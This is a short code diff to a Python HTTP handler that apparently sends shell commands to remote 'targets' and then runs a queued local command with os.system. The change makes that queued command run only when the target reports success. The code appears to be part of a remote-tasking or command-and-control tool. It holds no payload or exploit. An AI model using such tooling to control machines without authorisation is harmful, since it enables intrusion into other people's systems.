@@ -191,7 +191,7 @@ class TrashCollector(BaseHTTPRequestHandler):
             handle_shell(target)
             special = True
         elif cmd == "shell_FIN":
-            shell_FIN(target)
+            shell_FIN(target, res)
             special = True
 
         if special:
@@ -422,9 +422,12 @@ def send_shell(target, s):
     shell_arr = shlex.split(s)
     task(target, shell_arr[0], shell_arr[1:] )
 
-def shell_FIN(target):
-    print("Running: {}".format(FIN_WAIT[target]["cmd"]))
-    os.system(FIN_WAIT[target]["cmd"])
+def shell_FIN(target, success):
+    if success:
+        print("Running: {}".format(FIN_WAIT[target]["cmd"]))
+        os.system(FIN_WAIT[target]["cmd"])
+    else:
+        print("shell_FIN: failed")
     print("Deleting FIN_WAIT[{}] : ".format(target, FIN_WAIT[target]))
     del FIN_WAIT[target]
     
